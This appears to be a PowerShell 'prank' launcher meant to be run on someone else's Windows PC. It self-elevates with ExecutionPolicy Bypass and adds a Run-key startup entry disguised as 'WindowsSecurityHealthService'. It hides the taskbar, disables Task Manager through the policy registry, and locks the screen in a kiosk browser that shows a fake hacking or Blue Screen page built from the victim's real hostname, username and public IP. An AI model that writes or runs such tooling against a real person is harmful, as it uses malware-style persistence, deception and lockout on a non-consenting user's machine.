<#
.SYNOPSIS
    Windows Hacking Prank Launcher — Admin Required

.DESCRIPTION
    - Gathers real system info (hostname, user, public IP, disk, RAM)
    - Hides the taskbar
    - Optionally disables Task Manager (re-enabled on exit)
    - Opens the prank page in Edge/Chrome kiosk mode (no browser UI)
    - Installs itself as a startup entry so the prank runs on every reboot
    - On exit (victim hits Alt+Esc then Alt+Up): restores everything and
      removes the startup entry permanently

.PARAMETER BSOD
    Launch the fake Blue Screen of Death instead of the hacking terminal.

.PARAMETER NoTaskMgrBlock
    Skip disabling Task Manager (victim can still Ctrl+Shift+Esc out).

.PARAMETER Uninstall
    Remove the startup entry without launching the prank.

.EXAMPLE
    # Right-click launch-prank.ps1 → "Run as Administrator"
    .\launch-prank.ps1

    # Fake BSOD mode
    .\launch-prank.ps1 -BSOD

    # Remove startup persistence without running
    .\launch-prank.ps1 -Uninstall
#>
param(
    [switch]$BSOD,
    [switch]$NoTaskMgrBlock,
    [switch]$Uninstall
)

$ErrorActionPreference = 'Stop'
$StartupName = 'WindowsSecurityHealthService'
$StartupKey  = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$TmPath      = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'

# ─── Uninstall mode ──────────────────────────────────────────────────────────
if ($Uninstall) {
    Remove-ItemProperty -Path $StartupKey -Name $StartupName -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $TmPath     -Name 'DisableTaskMgr' -ErrorAction SilentlyContinue
    Write-Host 'Prank startup entry removed.' -ForegroundColor Green
    exit 0
}

# ─── Elevation check — re-launch as Administrator if needed ──────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $relaunchArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    if ($BSOD)           { $relaunchArgs += ' -BSOD' }
    if ($NoTaskMgrBlock) { $relaunchArgs += ' -NoTaskMgrBlock' }
    Start-Process powershell $relaunchArgs -Verb RunAs
    exit
}

# ─── Win32 API for taskbar show/hide ─────────────────────────────────────────
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")] public static extern int   ShowWindow(IntPtr hWnd, int nCmd);
    [DllImport("user32.dll")] public static extern IntPtr FindWindow(string cls, string win);
}
'@

$taskbar = [WinAPI]::FindWindow('Shell_TrayWnd', $null)

# ─── Gather real system data ──────────────────────────────────────────────────
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME

try {
    $pubIP = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 4).Content.Trim()
} catch {
    $pubIP = '203.0.113.1'   # RFC 5737 documentation address as safe fallback
}

$diskC = Get-PSDrive C | ForEach-Object {
    "$([math]::Round($_.Used / 1GB)) GB / $([math]::Round(($_.Used + $_.Free) / 1GB)) GB"
}

$ramGB = [math]::Round(
    (Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB
)

# ─── Install startup persistence ──────────────────────────────────────────────
# Runs silently (hidden window) on every login until the victim triggers the
# reveal chord (Alt+Esc → Alt+Up), which closes the browser and lets the
# finally block below remove this entry.
$startupArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
if ($BSOD)           { $startupArgs += ' -BSOD' }
if ($NoTaskMgrBlock) { $startupArgs += ' -NoTaskMgrBlock' }
Set-ItemProperty -Path $StartupKey -Name $StartupName -Value "powershell $startupArgs"

# ─── Hide taskbar ────────────────────────────────────────────────────────────
[WinAPI]::ShowWindow($taskbar, 0) | Out-Null   # 0 = hide

# ─── Optionally disable Task Manager ─────────────────────────────────────────
if (-not $NoTaskMgrBlock) {
    New-Item -Path $TmPath -Force | Out-Null
    Set-ItemProperty -Path $TmPath -Name 'DisableTaskMgr' -Value 1
    # Note: Ctrl+Alt+Del (the secure attention sequence) always works at OS
    # level and cannot be fully blocked — this only blocks Ctrl+Shift+Esc.
}

# ─── Build URL with real system data as query params ─────────────────────────
$page = if ($BSOD) { 'bsod-prank.html' } else { 'windows-hacking-prank.html' }
$htmlPath = Join-Path $PSScriptRoot $page
$query = "hostname=$([uri]::EscapeDataString($hostname))" +
         "&user=$([uri]::EscapeDataString($username))" +
         "&ip=$([uri]::EscapeDataString($pubIP))" +
         "&disk=$([uri]::EscapeDataString($diskC))" +
         "&ram=${ramGB}GB"
$url = "file:///$($htmlPath.Replace('\', '/'))?$query"

# ─── Launch in kiosk mode ─────────────────────────────────────────────────────
# Edge kiosk: no address bar, no title bar, no close button, fullscreen.
# The prank's reveal chord (Alt+Esc → Alt+Up) calls window.close(), which
# exits kiosk and unblocks the Wait-Process below.
$edgePath   = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe"
$chromePath = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"

$browser = if     (Test-Path $edgePath)   { $edgePath }
           elseif (Test-Path $chromePath) { $chromePath }
           else                           { $null }

try {
    if ($browser) {
        $kioskFlags = "--kiosk `"$url`" --edge-kiosk-type=fullscreen " +
                      "--no-first-run --disable-features=TranslateUI"
        $proc = Start-Process $browser $kioskFlags -PassThru
        # Wait until ALL Edge/Chrome processes spawned by this kiosk session exit
        $procName = [System.IO.Path]::GetFileNameWithoutExtension($browser)
        Start-Sleep -Seconds 3   # give the browser time to launch
        do { Start-Sleep -Seconds 1 } while (
            Get-Process -Name $procName -ErrorAction SilentlyContinue |
            Where-Object { $_.SessionId -eq $proc.SessionId }
        )
    } else {
        # No supported kiosk browser found — open in default browser (no lockdown)
        Start-Process $url
        Read-Host 'Press Enter after the victim has seen the prank, then cleanup will run'
    }
} finally {
    # ─── Cleanup — always runs even if script is interrupted ─────────────────
    [WinAPI]::ShowWindow($taskbar, 5) | Out-Null   # 5 = show/restore
    Remove-ItemProperty -Path $TmPath    -Name 'DisableTaskMgr' -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $StartupKey -Name $StartupName    -ErrorAction SilentlyContinue
}
